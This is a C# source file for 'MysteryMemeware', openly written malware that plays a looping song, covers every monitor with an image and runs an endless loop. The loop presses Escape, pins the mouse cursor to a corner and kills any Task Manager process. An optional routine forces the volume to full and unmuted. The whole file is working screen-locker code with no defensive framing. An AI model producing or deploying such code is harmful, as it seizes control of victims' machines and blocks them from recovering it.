using MysteryHelper;
namespace MysteryMemeware
{
	public static class Program
	{
		public const string CoverImageResourceName = "MysteryMemeware.CoverImage.bmp";
		public const string BackgroundSongResourceName = "MysteryMemeware.BackgroundSong.wav";
		public static void Main()
		{
			// LockFullVolume();
			System.Reflection.Assembly assembly = typeof(Program).Assembly;
			PlaySongLooping(assembly.GetManifestResourceStream(BackgroundSongResourceName));
			System.Drawing.Image coverImage = System.Drawing.Image.FromStream(assembly.GetManifestResourceStream(CoverImageResourceName));
			CoverAllScreens(coverImage);
			System.Diagnostics.Stopwatch stopwatch = new System.Diagnostics.Stopwatch();
			stopwatch.Start();
			long ticksLastUpdate = 0;
			while (true)
			{
				if (stopwatch.ElapsedTicks - ticksLastUpdate > 1000000)
				{
					Tick();
					ticksLastUpdate = stopwatch.ElapsedTicks;
				}
			}
		}
		private static void Tick()
		{
			try
			{
				Win32InputHelper.PressKey(27);
				Win32InputHelper.SetMousePosition(0, 0);
			}
			catch
			{

			}
			foreach (System.Diagnostics.Process process in System.Diagnostics.Process.GetProcesses())
			{
				try
				{
					if (process.MainWindowTitle.ToLower().Replace(" ", "") == "taskmanager")
					{
						process.Kill();
					}
				}
				catch
				{

				}
			}
		}
		public static void PlaySongLooping(System.IO.Stream songStream)
		{
			new System.Threading.Thread(() =>
			{
				System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer();
				soundPlayer.Stream = songStream;
				soundPlayer.Load();
				while (true)
				{
					soundPlayer.PlaySync();
				}
			}).Start();
		}
		public static void CoverAllScreens(System.Drawing.Image screenCoverImage)
		{
			foreach (System.Windows.Forms.Screen screen in System.Windows.Forms.Screen.AllScreens)
			{
				ScreenCoverForm screenCoverForm = new ScreenCoverForm(screen, screenCoverImage);
				new System.Threading.Thread(() =>
				{
					screenCoverForm.ShowDialog();
				}).Start();
			}
		}
		public static System.Threading.Thread LockFullVolume()
		{
			System.Threading.Thread output;
			output = new System.Threading.Thread(() =>
			{
				while (true)
				{
					try
					{
						VolumeHelper.SetVolume(1.0f);
						VolumeHelper.SetMute(false);
						System.Threading.Thread.Sleep(500);
					}
					catch
					{
					}
				}
			});
			output.Start();
			return output;
		}
	}
}